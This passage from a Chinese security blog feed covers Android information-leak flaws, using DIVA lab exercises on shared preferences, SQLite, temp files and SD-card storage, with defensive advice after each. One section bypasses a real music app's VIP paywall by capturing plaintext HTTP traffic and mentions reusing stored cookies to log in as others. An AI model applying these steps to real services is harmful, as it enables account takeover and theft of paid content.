src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/15.png" alt="image-20220104145701360"></p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护意见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>避免使用MODEWORLDWRITEABLE和MODEWORLDREADABLE模式创建进程间通信的文件，此处即为Shared Preferences</span><br><span class="line"><span class="number">2.</span>不要将密码等敏感信息存储在Shared Preferences等内部存储中</span><br><span class="line"><span class="number">3.</span>避免滥用<span class="string">&quot;Android:sharedUserId&quot;</span>属性</span><br><span class="line"><span class="number">4.</span>不要在使用“android:sharedUserId”属性的同时，对应用使用测试签名，否则其他应用拥有“android:sharedUserId<span class="string">&quot;属性值和测试签名是，将会访问到内部存储文件数据</span></span><br><span class="line"><span class="string">5.使用Secure Preferences第三方加固库进行存储</span></span><br></pre></td></tr></table></figure><h3 id="4-数据库存储漏洞"><a href="#4-数据库存储漏洞" class="headerlink" title="4.数据库存储漏洞"></a>4.数据库存储漏洞</h3><h4 id="（1）原理分析-3"><a href="#（1）原理分析-3" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>Database配置模式安全风险源于：</p><p>开发者在创建数据库（Database）时没有正确的选取合适的创建模式（MODE_PRIVATE、MODE_WORLD_READABLE）进行权限控制，从而导致数据库（Database）内容被恶意读写，造成账户密码、身份信息、以及其他敏感信息泄露，甚至攻击者进一步实施恶意攻击</p><h4 id="（2）漏洞案例——DIVA-apk例题4"><a href="#（2）漏洞案例——DIVA-apk例题4" class="headerlink" title="（2）漏洞案例——DIVA.apk例题4"></a>（2）漏洞案例——DIVA.apk例题4</h4><p>我们进入例题4</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/16.png" alt="image-20220104154306093"></p><p>然后我们输入相关信息并保存</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/17.png" alt="image-20220104154526963"></p><p>我们将数据库给拉取下来，然后使用SQLite查看</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/18.png" alt="image-20220104155824459"></p><p>我们就可以发现敏感信息，我们可以分析对应的代码段</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/19.png" alt="image-20220104155937819"></p><p>我们上文的存取数据库名也是从对应代码出找到</p><h4 id="（3）安全防护-2"><a href="#（3）安全防护-2" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>敏感信息在进行数据库存储时，对数据进行加密存储，并且应该避免弱加密或者是不安全的加密方式</span><br><span class="line"><span class="number">2.</span>对于敏感的数据库文件，不得使用MODE_WORLD_READABLE或者是MODE_WORLD_WRITEABLE进行创建</span><br></pre></td></tr></table></figure><h3 id="5-临时文件或SD卡漏洞"><a href="#5-临时文件或SD卡漏洞" class="headerlink" title="5.临时文件或SD卡漏洞"></a>5.临时文件或SD卡漏洞</h3><h4 id="（1）原理分析-4"><a href="#（1）原理分析-4" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>经过上文我们讲述的文件存储，现在的手机很多的公共目录都是自身自带的存储空间，Android系统的文件一般都存储在sdCard和应用的私有目录下，任何在Android Manifest中声明读写sdcard权限的应用都可以对sdcard进行读写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--在SDcard中创建与删除文件权限--&gt;</span><br><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span></span><br><span class="line">        tools:ignore=<span class="string">&quot;ProtectedPermissions&quot;</span> /&gt;</span><br><span class="line">&lt;!--往SDCard写入数据权限--&gt;</span><br><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞案例——DIVA-apk例题5与例题6"><a href="#（2）漏洞案例——DIVA-apk例题5与例题6" class="headerlink" title="（2）漏洞案例——DIVA.apk例题5与例题6"></a>（2）漏洞案例——DIVA.apk例题5与例题6</h4><p>我们打开例题5</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/20.png" alt="image-20220104161709796"></p><p>我们分析对应部分的相关代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/21.png" alt="image-20220104161841048"></p><p>根据代码，我们知道这里采用文件存储的方式，所以我们直接找到该文件，查看即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/22.png" alt="image-20220104162116624"></p><p>同理，我们打开例题6，查看对应的代码</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/23.png" alt="image-20220104162259850"></p><p>我们可以发现是存储在sd卡下，然后我们输入相关信息，之后直接去sdcard下查找，这里我们需要注意，需要给应用存取权限，否则是保存不了的</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/24.png" alt="image-20220104164309655"></p><h4 id="（3）安全防护-3"><a href="#（3）安全防护-3" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护意见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>不要将敏感信息存入本地固定的文件中，哪怕是加密存储也可能面临暴力破解的风险</span><br><span class="line"><span class="number">2.</span>对于保存信息的代码段进行混淆加密，使其难以被逆向人员简单分析获取</span><br></pre></td></tr></table></figure><h3 id="6-http明文传输漏洞"><a href="#6-http明文传输漏洞" class="headerlink" title="6. http明文传输漏洞"></a>6. http明文传输漏洞</h3><h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>开发人员在开发时对网络连接的一些敏感数据往往采用http明文传输，这样就十分容易导致恶意攻击者通过一些抓包工具进行捕获，获取敏感信息，导致信息泄露的风险</p><h4 id="（2）漏洞案例——XX音乐存在任意文件下载漏洞"><a href="#（2）漏洞案例——XX音乐存在任意文件下载漏洞" class="headerlink" title="（2）漏洞案例——XX音乐存在任意文件下载漏洞"></a>（2）漏洞案例——XX音乐存在任意文件下载漏洞</h4><p>这段时间我查看了一下国内主流的音乐软件平台，发现很多音乐软件都存在http明文传输的问题，这样势必会导致升级劫持、信息泄露、任意文件下载等等漏洞，这里我们列举一个有http明文泄露导致的任意文件下载问题</p><p>首先我们随便选择几首需要VIP下载的歌曲</p><p>等他</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/25.png" alt="image-20220104164309655"></p><p>我们发现这些音乐都需要开通VIP才能下载</p><p>接下来我们用抓包软件抓取</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/27.png" alt="image-20220104164309655"></p><p>我们发现了音乐的url，我们直接访问，发现可以直接下载</p><p>还有一些http明文传输漏洞导致任意登录，一些APP也会把登录成功的Cookie保存在本地，那么只要找到相关文件复制下来这个Cookie，就可以任意登录了。</p><h4 id="（3）安全防护-4"><a href="#（3）安全防护-4" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>采用https加密传输</span><br><span class="line"><span class="number">2.</span>敏感信息使用http传输，那么对敏感信息进行加密，并且使用非对称加密，或者公认的强加密算法</span><br><span class="line"><span class="number">3.</span>对以下字段进行加密处理：密码、手机号、快捷支付手机号、Email、身份证、银行卡、CVV码、有效期等</span><br></pre></td></tr></table></figure><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文对Android App中信息泄露漏洞的常见形式做了一个基本的讲述，当然实际过程中很多APP的信息泄露漏洞可能要比这个复杂，这里只是初步的为大家介绍一下信息泄露漏洞的基础知识，本文的样例我会上传到github上，这里放一个传送门：</p><p><a href="https://github.com/guoxuaa/Android-Vulnerability-Mining">github地址</a></p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>文件存储：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://juejin.cn/post/6844903778227847182#heading-10</span><br><span class="line">https://juejin.cn/post/6844904013515718664#heading-6</span><br></pre></td></tr></table></figure><p>其他存储：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/536ca489a7f4</span><br><span class="line">https://cloud.tencent.com/developer/article/1045171</span><br></pre></td></tr></table></figure><p>网络存储：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/doodle777/p/4937594.html</span><br><span class="line">https://blog.csdn.net/weixin_43689040/article/details/103761411</span><br></pre></td></tr></table></figure><p>漏洞挖掘参考：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.anquanke.com/post/id/84603</span></span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/86057</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;好久没有更新帖子了，最近一直都比较忙，这里首先祝大家腊八节快乐。本文主要围绕Android APP漏洞中的信息泄露漏洞展开描述，因为挖掘Android APP信息泄露漏洞的思路各有差异，所以本文只是基于Android APP中较为基础的信息泄露的漏洞实例开始讲述。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
